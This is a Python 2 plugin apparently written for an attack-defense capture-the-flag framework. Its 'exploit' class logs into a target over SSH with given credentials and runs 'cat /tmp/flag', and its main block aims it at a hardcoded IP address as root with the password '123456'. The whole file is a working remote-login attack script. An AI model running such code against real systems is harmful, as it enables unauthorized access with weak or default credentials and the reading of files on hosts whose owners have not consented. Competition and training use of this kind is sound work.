from plugin import plugin
import paramiko

class exploit(plugin):
    param_count = 2
    timeout = 1
    fail=["incorrect","password","invalid","wrong","fail","denied","not","error"] 
    def __init__(self,custom_log_dir,args):
        plugin.__init__(self,custom_log_dir,args)
        
    def exp(self):
        if len(self.args) != self.param_count:
            error_msg = "param_count not matched."
            self.log(__name__,error_msg)
            return False,self.host,self.port,self.args,error_msg
        self.username,self.password = self.args[0],self.args[1]
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self.host, self.port, self.username, self.password, timeout = self.timeout,allow_agent=False,look_for_keys=False)
            stdin,stdout,stderr = ssh.exec_command("cat /tmp/flag")    #这三个得到的都是类文件对象
            outmsg,errmsg = stdout.read(),stderr.read()    #读一次之后，stdout和stderr里就没有内容了，所以一定要用变量把它们带的信息给保存下来，否则read一次之后就没有了
            if errmsg == "":
                flag = outmsg
                return True,self.host,self.port,self.args,flag,"success"
            else:
                return True,self.host,self.port,self.args,"maybe flag not in there or permission denied.","success"
        except Exception,e:
            self.log(__name__,str(e))
            return False,self.host,self.port,self.args,None,str(e)
        
if __name__ == '__main__':
    print exploit('./',("45.76.150.56",6666,"root","123456")).probe()